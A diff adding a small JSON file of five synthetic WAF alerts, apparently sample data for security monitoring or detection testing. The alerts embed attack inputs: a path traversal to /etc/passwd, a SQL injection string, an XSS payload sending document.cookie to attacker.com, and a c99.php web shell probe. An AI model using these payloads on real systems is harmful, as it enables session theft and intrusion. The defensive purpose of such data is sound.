@@ -1,0 +1,57 @@
+[
+  {
+    "timestamp": "2026-10-24T21:00:10Z",
+    "source_type": "WAF",
+    "event_type": "web_scanner_activity",
+    "description": "Automated web application security scanner activity detected (User-Agent: Nikto/2.1.6)",
+    "source_ip": "198.51.100.144",
+    "destination_ip": "10.0.1.15",
+    "source_port": 58210,
+    "destination_port": 443,
+    "username": null
+  },
+  {
+    "timestamp": "2026-10-24T21:01:45Z",
+    "source_type": "WAF",
+    "event_type": "web_path_traversal",
+    "description": "Directory traversal attempt detected in GET /download?file=../../../../etc/passwd",
+    "source_ip": "198.51.100.144",
+    "destination_ip": "10.0.1.15",
+    "source_port": 58212,
+    "destination_port": 443,
+    "username": "guest"
+  },
+  {
+    "timestamp": "2026-10-24T21:03:20Z",
+    "source_type": "WAF",
+    "event_type": "web_sql_injection",
+    "description": "SQL Injection attempt detected in POST /api/v1/auth/login parameter ' OR 1=1--",
+    "source_ip": "198.51.100.144",
+    "destination_ip": "10.0.1.15",
+    "source_port": 58214,
+    "destination_port": 443,
+    "username": "admin"
+  },
+  {
+    "timestamp": "2026-10-24T21:05:00Z",
+    "source_type": "WAF",
+    "event_type": "web_xss_attempt",
+    "description": "Cross-Site Scripting (XSS) payload detected in HTTP request: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+    "source_ip": "198.51.100.144",
+    "destination_ip": "10.0.1.15",
+    "source_port": 58216,
+    "destination_port": 443,
+    "username": "user12"
+  },
+  {
+    "timestamp": "2026-10-24T21:07:15Z",
+    "source_type": "WAF",
+    "event_type": "web_shell_probe",
+    "description": "Web shell access attempt detected targeting /uploads/c99.php with system command parameter",
+    "source_ip": "198.51.100.144",
+    "destination_ip": "10.0.1.15",
+    "source_port": 58218,
+    "destination_port": 443,
+    "username": "www-data"
+  }
+]
